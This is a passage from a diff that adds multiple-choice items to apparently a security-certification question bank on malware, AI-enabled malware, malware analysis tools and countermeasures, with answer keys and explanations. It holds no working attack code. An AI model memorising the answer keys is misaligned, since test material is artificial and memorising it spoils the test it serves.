+    ],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0042",
+    "module": 7,
+    "section": "Fileless Malware Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "recall",
+    "difficulty": 1,
+    "stem": "Why is fileless malware hard for traditional antivirus to catch?",
+    "options": [
+      "It only runs when the antivirus is updating",
+      "It leaves little or nothing on disk for file scanning and uses trusted system tools",
+      "It is always digitally signed by Microsoft",
+      "It encrypts the antivirus database"
+    ],
+    "answer": 1,
+    "explanation": "Detection moves to behavior, memory, script logging and AMSI, because signature scanning of files misses it.",
+    "optionNotes": [
+      "Timing with updates is not the reason.",
+      "Correct: file scanning has no file to scan, and the tools involved are legitimate.",
+      "The malicious code is not signed; it runs through signed tools.",
+      "Encrypting AV databases is not what defines fileless malware."
+    ],
+    "tags": ["fileless", "detection"],
+    "sources": [
+      "https://learn.microsoft.com/en-us/defender-endpoint/malware/fileless-threats",
+      "https://www.cisa.gov/resources-tools/resources/identifying-and-mitigating-living-land-techniques"
+    ],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0043",
+    "module": 7,
+    "section": "AI-based Malware Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "recall",
+    "difficulty": 1,
+    "stem": "What does MITRE ATT&CK technique T1588.007 describe?",
+    "options": [
+      "Malware that disables antivirus products",
+      "Attacks that poison a company's machine learning training data",
+      "Adversaries obtaining generative AI tools to support their operations",
+      "Ransomware that encrypts cloud storage"
+    ],
+    "answer": 2,
+    "explanation": "T1588.007 covers attackers using LLMs for recon, scripting, social engineering and even payload development.",
+    "optionNotes": [
+      "Disabling security tools is T1562.001.",
+      "Poisoning is an adversarial ML attack, covered by NIST AI 100-2 and MITRE ATLAS.",
+      "Correct: Obtain Capabilities: Artificial Intelligence.",
+      "Encryption for impact is T1486."
+    ],
+    "tags": ["ai", "v13-new", "mitre-attack"],
+    "sources": [
+      "https://attack.mitre.org/techniques/T1588/007/",
+      "https://www.microsoft.com/en-us/security/blog/2024/02/14/staying-ahead-of-threat-actors-in-the-age-of-ai/"
+    ],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0044",
+    "module": 7,
+    "section": "AI-based Malware Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "recall",
+    "difficulty": 2,
+    "stem": "According to the UK NCSC's assessment, in which areas does AI give attackers the clearest uplift in the near term?",
+    "options": [
+      "Hardware manufacturing",
+      "Breaking modern encryption",
+      "Physical intrusion into data centers",
+      "Reconnaissance and social engineering"
+    ],
+    "answer": 3,
+    "explanation": "Public assessments agree: AI makes recon and phishing more effective and lowers the entry bar; truly novel AI malware needs data, skill and resources.",
+    "optionNotes": [
+      "Hardware manufacturing is unrelated.",
+      "AI does not break sound cryptography.",
+      "Physical intrusion is not where AI helps most.",
+      "Correct: faster research and more convincing lures."
+    ],
+    "tags": ["ai", "v13-new"],
+    "sources": [
+      "https://www.ncsc.gov.uk/report/impact-of-ai-on-cyber-threat",
+      "https://cloud.google.com/blog/topics/threat-intelligence/adversarial-misuse-generative-ai"
+    ],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0045",
+    "module": 7,
+    "section": "AI-based Malware Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "scenario",
+    "difficulty": 1,
+    "stem": "A finance clerk gets a video call from someone who looks and sounds exactly like the CFO, urgently asking for a wire transfer to a new supplier. What is the BEST control?",
+    "options": [
+      "Verify the request through a separate channel, such as calling the CFO's known number",
+      "Approve it quickly because the video proves it is the CFO",
+      "Ask the caller to repeat the request by e-mail",
+      "Install a newer video conferencing app"
+    ],
+    "answer": 0,
+    "explanation": "Deepfakes make seeing and hearing unreliable. Payment processes need call-back verification and two-person approval.",
+    "optionNotes": [
+      "Correct: out-of-band verification defeats deepfake impersonation.",
+      "Video and voice can be synthesized (deepfakes).",
+      "The attacker can also send the e-mail; it is the same channel of trust.",
+      "The app is not the weakness; the process is."
+    ],
+    "tags": ["ai", "v13-new", "deepfake"],
+    "sources": [
+      "https://media.defense.gov/2023/Sep/12/2003298925/-1/-1/0/CSI-DEEPFAKE-THREATS.PDF",
+      "https://www.ncsc.gov.uk/report/impact-of-ai-on-cyber-threat"
+    ],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0046",
+    "module": 7,
+    "section": "AI-based Malware Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "recall",
+    "difficulty": 3,
+    "stem": "Google's threat intelligence group described PROMPTFLUX in 2025. What made it notable?",
+    "options": [
+      "It was the first worm to spread over Bluetooth",
+      "It asked an LLM at run time to rewrite its own code so each copy looked different",
+      "It encrypted files with a quantum-resistant algorithm",
+      "It infected the BIOS of AI servers"
+    ],
+    "answer": 1,
+    "explanation": "Runtime LLM use is still experimental, but it shows why hash and signature matching alone will keep losing ground.",
+    "optionNotes": [
+      "Bluetooth spreading is not what the report described.",
+      "Correct: \"just-in-time\" self-modification to evade static signatures.",
+      "Encryption algorithms were not its notable feature.",
+      "Firmware infection was not part of the report."
+    ],
+    "tags": ["ai", "v13-new", "evasion"],
+    "sources": [
+      "https://cloud.google.com/blog/topics/threat-intelligence/threat-actor-usage-of-ai-tools",
+      "https://attack.mitre.org/techniques/T1027/"
+    ],
+    "verify": true,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0047",
+    "module": 7,
+    "section": "AI-based Malware Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "scenario",
+    "difficulty": 3,
+    "stem": "Attackers make small changes to a malware sample until the company's machine learning detector scores it as benign, while the malware still works. What kind of attack is this?",
+    "options": ["An evasion attack against the ML model", "A poisoning attack", "A supply chain attack", "A watering hole attack"],
+    "answer": 0,
+    "explanation": "NIST AI 100-2 names evasion as the main attack on deployed classifiers. Layered detection keeps one fooled model from being fatal.",
+    "optionNotes": [
+      "Correct: crafted inputs cause misclassification at run time.",
+      "Poisoning corrupts the training data, not the input being scored.",
+      "No trusted supplier was compromised.",
+      "No website frequented by the victims was infected."
+    ],
+    "tags": ["ai", "v13-new", "adversarial-ml"],
+    "sources": ["https://csrc.nist.gov/pubs/ai/100/2/e2025/final", "https://atlas.mitre.org/"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0048",
+    "module": 7,
+    "section": "AI-based Malware Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "recall",
+    "difficulty": 2,
+    "stem": "In adversarial machine learning, what is a poisoning attack?",
+    "options": [
+      "Stealing the model's weights",
+      "Flooding the model's API until it crashes",
+      "Corrupting the training data so the model learns wrong behavior",
+      "Tricking the model with one crafted input at run time"
+    ],
+    "answer": 2,
+    "explanation": "Poisoning targets the training stage; evasion targets the deployed model's inputs.",
+    "optionNotes": [
+      "That is model theft or extraction.",
+      "That is a denial of service.",
+      "Correct: the attack happens before or during training.",
+      "That is an evasion attack."
+    ],
+    "tags": ["ai", "v13-new", "adversarial-ml"],
+    "sources": ["https://csrc.nist.gov/pubs/ai/100/2/e2025/final", "https://atlas.mitre.org/"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0049",
+    "module": 7,
+    "section": "AI-based Malware Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "tool",
+    "difficulty": 2,
+    "stem": "An analyst wants a plain-language summary, generated by AI, of what an obfuscated script does, alongside multi-engine antivirus results. Which feature fits?",
+    "options": ["chkrootkit", "Wireshark", "Autoruns", "VirusTotal Code Insight"],
+    "answer": 3,
+    "explanation": "AI-powered analysis features speed up triage, but the analyst still confirms the behavior with real evidence.",
+    "optionNotes": [
+      "chkrootkit checks Linux systems for rootkits.",
+      "Wireshark captures network traffic.",
+      "Autoruns lists autostart entries.",
+      "Correct: an LLM-based explanation of the uploaded code in VirusTotal."
+    ],
+    "tags": ["ai", "v13-new", "tools"],
+    "sources": ["https://blog.virustotal.com/2023/04/introducing-virustotal-code-insight.html", "https://docs.virustotal.com/docs/how-it-works"],
+    "verify": true,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0050",
+    "module": 7,
+    "section": "AI-based Malware Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "scenario",
+    "difficulty": 1,
+    "stem": "An attacker uses AI to generate a new variant of the same malware for every victim, so no two files share a hash. Which detection approach stays MOST effective?",
+    "options": [
+      "Blocking the hashes from last week's report",
+      "Behavior-based detection and EDR telemetry",
+      "Checking the file size",
+      "Renaming file extensions"
+    ],
+    "answer": 1,
+    "explanation": "When the bytes change constantly, detect what the code does: process chains, persistence, network behavior.",
+    "optionNotes": [
+      "Every new variant has a new hash.",
+      "Correct: the behavior stays the same even when the bytes change.",
+      "File size varies and proves nothing.",
+      "Renaming extensions does not detect anything."
+    ],
+    "tags": ["ai", "v13-new", "detection"],
+    "sources": [
+      "https://learn.microsoft.com/en-us/defender-endpoint/overview-endpoint-detection-response",
+      "https://cloud.google.com/blog/topics/threat-intelligence/threat-actor-usage-of-ai-tools",
+      "https://detect-respond.blogspot.com/2013/03/the-pyramid-of-pain.html"
+    ],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0051",
+    "module": 7,
+    "section": "AI-based Malware Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "recall",
+    "difficulty": 2,
+    "stem": "ESET reported PromptLock in August 2025. What was it?",
+    "options": [
+      "A password manager with AI features",
+      "A proof-of-concept ransomware that used a local LLM to generate scripts on the fly",
+      "A botnet made of AI servers",
+      "A vulnerability in a large language model's tokenizer"
+    ],
+    "answer": 1,
+    "explanation": "PromptLock generated Lua scripts from hard-coded prompts to find, steal and encrypt files. The usual ransomware controls still apply.",
+    "optionNotes": [
+      "It was not a legitimate product.",
+      "Correct: described as the first known AI-powered ransomware, later linked to an academic prototype.",
+      "It did not enslave AI servers.",
+      "It was malware, not a model vulnerability."
+    ],
+    "tags": ["ai", "v13-new", "ransomware"],
+    "sources": [
+      "https://www.welivesecurity.com/en/ransomware/first-known-ai-powered-ransomware-uncovered-eset-research/",
+      "https://cloud.google.com/blog/topics/threat-intelligence/threat-actor-usage-of-ai-tools"
+    ],
+    "verify": true,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0052",
+    "module": 7,
+    "section": "AI-based Malware Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "scenario",
+    "difficulty": 1,
+    "stem": "A SOC's AI assistant summarizes an alert and states that a flagged file is benign. What should the analyst do?",
+    "options": [
+      "Delete the file and the logs",
+      "Close the alert, because AI verdicts are always right",
+      "Check the verdict against evidence such as hashes, behavior and logs before closing the alert",
+      "Disable the AI assistant permanently"
+    ],
+    "answer": 2,
+    "explanation": "AI helps with speed, but the analyst stays accountable and confirms conclusions with evidence.",
+    "optionNotes": [
+      "Deleting evidence harms the investigation.",
+      "Models can be wrong, and they can be manipulated.",
+      "Correct: AI output is an input to the decision, not the decision.",
+      "The tool can still help; it just needs checking."
+    ],
+    "tags": ["ai", "v13-new", "soc"],
+    "sources": ["https://csrc.nist.gov/pubs/ai/100/2/e2025/final", "https://blog.virustotal.com/2023/04/introducing-virustotal-code-insight.html"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0053",
+    "module": 7,
+    "section": "Malware Analysis",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "recall",
+    "difficulty": 1,
+    "stem": "What is usually the FIRST step of static analysis on a new sample?",
+    "options": ["Upload the victim's documents", "Run it in a sandbox", "Attach a debugger and run it", "Calculate its cryptographic hash"],
+    "answer": 3,
+    "explanation": "Fingerprint first: the hash lets you check reputation and track the sample without running it.",
+    "optionNotes": [
+      "Victim documents are not the sample and may be confidential.",
+      "Running the sample is dynamic analysis.",
+      "Debugging while running is dynamic.",
+      "Correct: the hash is a unique ID to search and share."
+    ],
+    "tags": ["hashing", "static-analysis"],
+    "sources": [
+      "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil",
+      "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash"
+    ],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0054",
+    "module": 7,
+    "section": "Malware Analysis",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "command-output",
+    "difficulty": 1,
+    "stem": "An analyst runs `certutil -hashfile sample.exe SHA256` and gets a 64-character hexadecimal value. What can the analyst do with it?",
+    "options": [
+      "Search threat intelligence and VirusTotal for the same file without running it",
+      "Decrypt the sample's payload",
+      "See which network ports the sample opens",
+      "Remove the sample's digital signature"
+    ],
+    "answer": 0,
+    "explanation": "certutil -hashfile (or Get-FileHash) creates a fingerprint used to look up and share the sample.",
+    "optionNotes": [
+      "Correct: the SHA-256 value identifies the exact file.",
+      "A hash is one-way; it decrypts nothing.",
+      "Ports appear only when the sample runs.",
+      "Hashing does not change the file."
+    ],
+    "tags": ["hashing", "command-output"],
+    "sources": [
+      "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil",
+      "https://docs.virustotal.com/docs/how-it-works"
+    ],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0055",
+    "module": 7,
+    "section": "Malware Analysis",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "scenario",
+    "difficulty": 2,
+    "stem": "An analyst suspects a confidential internal contract contains a malicious macro and wants a VirusTotal verdict. What should the analyst do FIRST?",
+    "options": [
+      "Rename the file and upload it",
+      "Upload the file, because VirusTotal keeps uploads private",
+      "E-mail the file to a public malware forum",
+      "Search VirusTotal by the file's hash instead of uploading it"
+    ],
+    "answer": 3,
+    "explanation": "VirusTotal shares submitted files with the security community, so confidential files should only be looked up by hash.",
+    "optionNotes": [
+      "Renaming does not change what is shared.",
+      "Uploads are shared with VirusTotal's partners and premium users.",
+      "That leaks the document even more widely.",
+      "Correct: a hash lookup reveals nothing about the content."
+    ],
+    "tags": ["virustotal", "static-analysis"],
+    "sources": ["https://docs.virustotal.com/docs/how-it-works", "https://learn.microsoft.com/en-us/sysinternals/downloads/sigcheck"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0056",
+    "module": 7,
+    "section": "Malware Analysis",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "tool",
+    "difficulty": 1,
+    "stem": "Which Sysinternals tool extracts readable ASCII and Unicode text, such as URLs and IP addresses, from a binary file?",
+    "options": ["Autoruns", "TCPView", "Strings", "Process Explorer"],
+    "answer": 2,
+    "explanation": "Strings is a quick static step: embedded URLs, file paths and messages often reveal the sample's purpose.",
+    "optionNotes": [
+      "Autoruns lists autostart entries.",
+      "TCPView shows live network endpoints.",
+      "Correct: it scans a file for text sequences.",
+      "Process Explorer shows running processes."
+    ],
+    "tags": ["static-analysis", "sysinternals"],
+    "sources": ["https://learn.microsoft.com/en-us/sysinternals/downloads/strings", "https://docs.remnux.org/"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0057",
+    "module": 7,
+    "section": "Malware Analysis",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "command-output",
+    "difficulty": 2,
+    "stem": "Detect It Easy reports `Packer: UPX` for sample.exe, with entropy near 7.9 and only a handful of imports. What does this suggest?",
+    "options": [
+      "The real code is packed and must be unpacked before deeper static analysis",
+      "The file is a plain text document",
+      "The file is signed by Microsoft",
+      "The file has already been removed by antivirus"
+    ],
+    "answer": 0,
+    "explanation": "Packing hides the real code until run time (ATT&CK T1027.002). Unpack it, or use dynamic analysis to see it in memory.",
+    "optionNotes": [
+      "Correct: high entropy and few imports are typical of packed files.",
+      "Text files have low entropy and no imports.",
+      "Packing says nothing about signatures.",
+      "Detect It Easy only analyzes the file."
+    ],
+    "tags": ["packing", "command-output"],
+    "sources": ["https://github.com/horsicq/Detect-It-Easy", "https://upx.github.io/", "https://attack.mitre.org/techniques/T1027/002/"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0058",
+    "module": 7,
+    "section": "Malware Analysis",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "tool",
+    "difficulty": 2,
+    "stem": "During dynamic analysis, which tool shows every file, registry and process operation the sample performs, in real time?",
+    "options": ["Strings", "Process Monitor", "Sigcheck", "Ghidra"],
+    "answer": 1,
+    "explanation": "Process Monitor with a filter on the sample's process shows exactly what it touches.",
+    "optionNotes": [
+      "Strings reads the file statically.",
+      "Correct: it combines the old Filemon and Regmon.",
+      "Sigcheck checks signatures and versions.",
+      "Ghidra disassembles code statically."
+    ],
+    "tags": ["sysinternals", "dynamic-analysis"],
+    "sources": ["https://learn.microsoft.com/en-us/sysinternals/downloads/procmon", "https://docs.remnux.org/"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0059",
+    "module": 7,
+    "section": "Malware Analysis",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "tool",
+    "difficulty": 1,
+    "stem": "An analyst sees an unknown connection to an external address and wants to know which process owns it. Which tool shows this at a glance?",
+    "options": ["Strings", "TCPView", "Regshot", "ssdeep"],
+    "answer": 1,
+    "explanation": "TCPView (or netstat with process IDs) links network activity to a process during dynamic analysis.",
+    "optionNotes": [
+      "Strings reads text from files.",
+      "Correct: it lists TCP/UDP endpoints with the owning process.",
+      "Regshot compares registry snapshots.",
+      "ssdeep computes fuzzy hashes."
+    ],
+    "tags": ["sysinternals", "dynamic-analysis"],
+    "sources": [
+      "https://learn.microsoft.com/en-us/sysinternals/downloads/tcpview",
+      "https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer"
+    ],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0060",
+    "module": 7,
+    "section": "Malware Analysis",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "tool",
+    "difficulty": 2,
+    "stem": "An analyst wants to compare the registry before and after running a sample to see every key it added or changed. Which tool is built for this?",
+    "options": ["Ghidra", "Wireshark", "UPX", "Regshot"],
+    "answer": 3,
+    "explanation": "Snapshot comparison is a simple way to catch persistence and configuration changes made by a sample.",
+    "optionNotes": [
+      "Ghidra is a reverse engineering framework.",
+      "Wireshark captures network traffic.",
+      "UPX packs executables.",
+      "Correct: it takes two snapshots and diffs them."
+    ],
+    "tags": ["dynamic-analysis", "tools"],
+    "sources": ["https://sourceforge.net/projects/regshot/", "https://docs.remnux.org/"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0061",
+    "module": 7,
+    "section": "Malware Analysis",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "scenario",
+    "difficulty": 2,
+    "stem": "A sample does nothing in the analysis sandbox, yet the same file encrypts files on real laptops. What is the MOST likely explanation?",
+    "options": [
+      "The sample only works on Linux",
+      "The sandbox antivirus fixed the sample",
+      "It detects the virtual environment and hides its behavior",
+      "The sample's hash changed in the sandbox"
+    ],
+    "answer": 2,
+    "explanation": "SP 800-83 warns that some malware detects virtual machines. Analysts harden the lab to look real or analyze statically.",
+    "optionNotes": [
+      "It works on the real Windows laptops.",
+      "An analysis sandbox is not supposed to clean samples.",
+      "Correct: virtualization/sandbox evasion (ATT&CK T1497).",
+      "Copying a file does not change its hash."
+    ],
+    "tags": ["sandbox", "evasion"],
+    "sources": ["https://attack.mitre.org/techniques/T1497/", "https://csrc.nist.gov/pubs/sp/800/83/r1/final"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0062",
+    "module": 7,
+    "section": "Malware Analysis",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "tool",
+    "difficulty": 2,
+    "stem": "In an isolated lab, an analyst wants the sample to believe it has reached the internet (DNS, HTTP, SMTP) without any real connection. Which tool provides this?",
+    "options": ["INetSim", "Autoruns", "Sigcheck", "chkrootkit"],
+    "answer": 0,
+    "explanation": "Simulated services let the sample show its network behavior safely, and the logs record what it tried.",
+    "optionNotes": [
+      "Correct: it simulates common internet services in a lab.",
+      "Autoruns lists autostarts.",
+      "Sigcheck checks file signatures.",
+      "chkrootkit checks Linux hosts for rootkits."
+    ],
+    "tags": ["malware-lab", "tools"],
+    "sources": ["https://www.inetsim.org/", "https://docs.remnux.org/"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0063",
+    "module": 7,
+    "section": "Malware Analysis",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "recall",
+    "difficulty": 3,
+    "stem": "What is ssdeep used for in malware analysis?",
+    "options": [
+      "Finding files that are similar but not identical, using fuzzy hashes",
+      "Unpacking UPX-packed executables",
+      "Decrypting HTTPS traffic",
+      "Listing autostart entries"
+    ],
+    "answer": 0,
+    "explanation": "A single changed byte gives a completely new SHA-256, but a fuzzy hash still shows the files are related.",
+    "optionNotes": [
+      "Correct: context triggered piecewise hashing matches related variants.",
+      "Unpacking needs the packer or a debugger.",
+      "ssdeep does not touch traffic.",
+      "That is Autoruns."
+    ],
+    "tags": ["hashing", "static-analysis"],
+    "sources": ["https://ssdeep-project.github.io/ssdeep/", "https://docs.virustotal.com/docs/file-similarity-search"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0064",
+    "module": 7,
+    "section": "Malware Analysis",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "recall",
+    "difficulty": 2,
+    "stem": "What are the main parts of a YARA rule?",
+    "options": [
+      "A source IP, destination IP and port",
+      "A rule name, optional meta, strings to look for, and a condition",
+      "A username, password and domain",
+      "A CVE number, CVSS score and patch ID"
+    ],
+    "answer": 1,
+    "explanation": "YARA identifies and classifies malware by textual or binary patterns. A good rule targets features that stay stable across variants.",
+    "optionNotes": [
+      "That describes a firewall rule.",
+      "Correct: strings plus a boolean condition decide a match.",
+      "That describes credentials.",
+      "That describes a vulnerability record."
+    ],
+    "tags": ["yara"],
+    "sources": ["https://yara.readthedocs.io/en/stable/writingrules.html", "https://virustotal.github.io/yara/"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0065",
+    "module": 7,
+    "section": "Malware Analysis",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "scenario",
+    "difficulty": 1,
+    "stem": "Which lab setup is SAFEST for running an unknown sample?",
+    "options": [
+      "A production server, so the real environment is tested",
+      "The analyst's own work laptop, with antivirus turned off",
+      "An isolated VM on a host-only network, with a snapshot to revert and no shared folders",
+      "A VM bridged to the corporate network so the sample can reach its C2"
+    ],
+    "answer": 2,
+    "explanation": "SP 800-83 recommends isolated test systems, often virtualized, that are replaced with a known good image after analysis.",
+    "optionNotes": [
+      "Never run malware on production systems.",
+      "A work laptop holds real data and credentials.",
+      "Correct: isolation plus a known good snapshot.",
+      "Bridging lets the sample spread and alert the attacker."
+    ],
+    "tags": ["malware-lab"],
+    "sources": ["https://csrc.nist.gov/pubs/sp/800/83/r1/final", "https://github.com/mandiant/flare-vm"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0066",
+    "module": 7,
+    "section": "Malware Analysis",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "command-output",
+    "difficulty": 3,
+    "stem": "Sysmon logs event ID 22 for `rundll32.exe` with QueryName `kq3v9x0zpl.example`, followed by 50 more random-looking names within one minute, most of them failing. What does this MOST likely indicate?",
+    "options": [
+      "A DNS server zone transfer",
+      "A normal Windows Update check",
+      "A user browsing news websites",
+      "Malware using a domain generation algorithm to find its C2 server"
+    ],
+    "answer": 3,
+    "explanation": "Event 22 is a DNS query. Many random names from a LOLBin such as rundll32 point to DGA-based C2 (T1568.002).",
+    "optionNotes": [
+      "Zone transfers happen between DNS servers, not from rundll32.",
+      "Windows Update uses a small set of known Microsoft domains.",
+      "Users do not visit dozens of random names per minute from rundll32.",
+      "Correct: bursts of random, mostly failing lookups are a DGA pattern."
+    ],
+    "tags": ["sysmon", "dga", "command-output"],
+    "sources": ["https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon", "https://attack.mitre.org/techniques/T1568/002/"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0067",
+    "module": 7,
+    "section": "Malware Analysis",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "recall",
+    "difficulty": 2,
+    "stem": "In the Pyramid of Pain, which kind of indicator is the HARDEST for an attacker to change?",
+    "options": ["Tactics, techniques and procedures (TTPs)", "File hash values", "IP addresses", "Domain names"],
+    "answer": 0,
+    "explanation": "Detections built on behavior (TTPs) hurt attackers more than hash or IP blocklists do.",
+    "optionNotes": [
+      "Correct: changing how you operate costs the most.",
+      "Hashes change with any recompile: trivial.",
+      "IP addresses are easy to change.",
+      "Domains are simple to change."
+    ],
+    "tags": ["ioc", "threat-intelligence"],
+    "sources": ["https://detect-respond.blogspot.com/2013/03/the-pyramid-of-pain.html", "https://csrc.nist.gov/glossary/term/indicator"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0068",
+    "module": 7,
+    "section": "Malware Analysis",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "tool",
+    "difficulty": 1,
+    "stem": "Which free reverse engineering framework, released by the NSA, disassembles and decompiles binaries for deep static analysis?",
+    "options": ["TCPView", "Wireshark", "INetSim", "Ghidra"],
+    "answer": 3,
+    "explanation": "Ghidra and IDA turn machine code back into readable logic, the deepest level of static analysis.",
+    "optionNotes": [
+      "TCPView lists network endpoints.",
+      "Wireshark analyzes network traffic.",
+      "INetSim simulates internet services.",
+      "Correct: open-source SRE framework with a decompiler."
+    ],
+    "tags": ["reverse-engineering", "tools"],
+    "sources": ["https://github.com/NationalSecurityAgency/ghidra", "https://hex-rays.com/ida-pro"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0069",
+    "module": 7,
+    "section": "Malware Countermeasures",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "ec-council-term",
+    "difficulty": 2,
+    "stem": "Which virus detection method compares current file checksums against a known good baseline to spot changes?",
+    "options": ["Interception", "Code emulation", "Integrity checking", "Heuristic analysis"],
+    "answer": 2,
+    "explanation": "Integrity checking detects that something changed, not what the malware is. File integrity tools such as AIDE work this way.",
+    "optionNotes": [
+      "Interception watches OS requests as they happen.",
+      "Code emulation runs code in a virtual CPU.",
+      "Correct: any change to a protected file is flagged.",
+      "Heuristics look for suspicious traits in unknown code."
+    ],
+    "tags": ["virus-detection", "ec-council-specific"],
+    "sources": ["https://www.eccouncil.org/train-certify/certified-ethical-hacker-ceh/", "https://aide.github.io/"],
+    "verify": true,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0070",
+    "module": 7,
+    "section": "Malware Countermeasures",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "ec-council-term",
+    "difficulty": 1,
+    "stem": "A company sets up a stand-alone, isolated computer where every incoming USB drive and downloaded file is scanned before it may be used on the network. What does EC-Council call this computer?",
+    "options": ["Honeypot", "Sheep dip", "Jump box", "Bastion host"],
+    "answer": 1,
+    "explanation": "Sheep dipping checks media and files in isolation before they can reach production systems.",
+    "optionNotes": [
+      "A honeypot is a decoy that attracts attackers.",
+      "Correct: an isolated scanning station for incoming media.",
+      "A jump box is an admin gateway into a secure zone.",
+      "A bastion host is a hardened, internet-facing server."
+    ],
+    "tags": ["malware-lab", "ec-council-specific"],
+    "sources": [
+      "https://www.eccouncil.org/train-certify/certified-ethical-hacker-ceh/",
+      "https://www.cisa.gov/news-events/news/using-caution-usb-drives"
+    ],
+    "verify": true,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0071",
+    "module": 7,
+    "section": "Malware Countermeasures",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "recall",
+    "difficulty": 2,
+    "stem": "Which detection approach flags unknown files by looking for suspicious traits in their code, at the cost of more false positives?",
+    "options": ["Integrity checking", "Signature scanning", "Hash blocklisting", "Heuristic analysis"],
+    "answer": 3,
+    "explanation": "Signatures are precise but blind to new malware; heuristics and behavior monitoring cover the gap.",
+    "optionNotes": [
+      "Integrity checking only reports change.",
+      "Signatures need a known pattern.",
+      "Hash blocklists need the exact file.",
+      "Correct: it can catch new variants because it does not need an exact match."
+    ],
+    "tags": ["detection"],
+    "sources": ["https://csrc.nist.gov/pubs/sp/800/83/r1/final", "https://docs.virustotal.com/docs/how-it-works"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0072",
+    "module": 7,
+    "section": "Malware Countermeasures",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "scenario",
+    "difficulty": 1,
+    "stem": "Kiosk PCs in a public library keep getting infected by programs that visitors download. Which control stops unknown executables from running at all?",
+    "options": ["Application allowlisting", "Longer passwords", "A bigger hard disk", "Daily defragmentation"],
+    "answer": 0,
+    "explanation": "Allowlisting (App Control for Business, AppLocker) is strongest on fixed-purpose systems like kiosks.",
+    "optionNotes": [
+      "Correct: only approved applications may run (NIST SP 800-167).",
+      "Passwords do not decide what may execute.",
+      "Disk size is irrelevant.",
+      "Defragmentation does not block programs."
+    ],
+    "tags": ["allowlisting"],
+    "sources": [
+      "https://csrc.nist.gov/pubs/sp/800/167/final",
+      "https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/applocker-overview"
+    ],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0073",
+    "module": 7,
+    "section": "Malware Countermeasures",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "scenario",
+    "difficulty": 3,
+    "stem": "On a file server, a rootkit replaced several system binaries. The antivirus now reports the host as cleaned and the server seems stable. According to NIST SP 800-83, what should the team do?",
+    "options": [
+      "Keep it in production because the antivirus cleaned it",
+      "Rebuild the server from known good media and restore data from clean backups",
+      "Run the same antivirus scan once more",
+      "Change the administrator password only"
+    ],
+    "answer": 1,
